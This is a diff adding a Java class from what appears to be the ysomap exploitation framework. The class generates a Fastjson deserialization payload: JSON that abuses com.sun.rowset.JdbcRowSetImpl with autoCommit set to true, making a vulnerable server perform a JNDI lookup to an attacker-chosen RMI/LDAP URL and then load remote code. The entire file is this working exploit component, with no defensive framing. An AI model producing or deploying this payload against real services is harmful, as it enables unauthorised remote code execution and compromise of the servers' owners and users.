@@ -1,0 +1,26 @@
+package ysomap.bullets.json;
+
+import ysomap.bullets.Bullet;
+import ysomap.common.annotation.*;
+
+/**
+ * @author wh1t3P1g
+ * @since 2020/3/18
+ */
+@Bullets
+@Authors({Authors.WH1T3P1G})
+@Details("适用Fastjson，向外部发起jndi连接")
+@Dependencies({"fastjson"})
+public class JdbcRowSetImplJsonBullet implements Bullet<String> {
+
+    @NotNull
+    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
+    public String jndiURL;
+
+    @Override
+    public String getObject() {// 由于这里存在autoCommit 不是实际存在的属性，所以这里直接返回字符串
+        return "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
+                "\"xxxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
+                "\""+ jndiURL +"\",\"autoCommit\":true}}}";
+    }
+}
